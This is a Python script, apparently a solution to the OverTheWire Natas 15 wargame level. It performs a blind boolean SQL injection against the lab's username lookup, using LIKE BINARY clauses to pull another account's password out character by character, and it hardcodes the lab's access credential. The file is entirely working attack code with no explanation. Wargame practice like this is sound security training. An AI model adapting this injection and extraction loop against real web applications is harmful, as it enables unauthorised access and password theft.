import requests
import string

url = "http://natas15.natas.labs.overthewire.org"
natas15_username = "natas15"
natas15_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

success_phrase = "This user exists."

characters = "".join([string.ascii_letters, string.digits])


def find_password_letters():
    letters = []
    print("Finding password letters...")
    for c in characters:
        uri = url + '?username=natas16"+and+password+LIKE+BINARY+"%' + c + '%&debug'
        r = requests.get(uri, auth=(natas15_username, natas15_password))
        if success_phrase in r.text:
            letters.append(c)
    print("All password letters found!")
    return letters


def brute_force_password(password_letters):
    print("Brute-forcing password...")
    password = ""
    for _ in range(1, 64):
        for c in password_letters:
            test = password + c
            uri = url + '?username=natas16"+and+password+LIKE+BINARY+"' + test + '%&debug'
            resp = requests.get(uri, auth=(natas15_username, natas15_password))
            if success_phrase in resp.text:
                password += c
    print("Brute-forcing password complete!")
    return password


if __name__ == "__main__":
    letters = find_password_letters()
    password = brute_force_password(letters)
    print("Password: ", password)
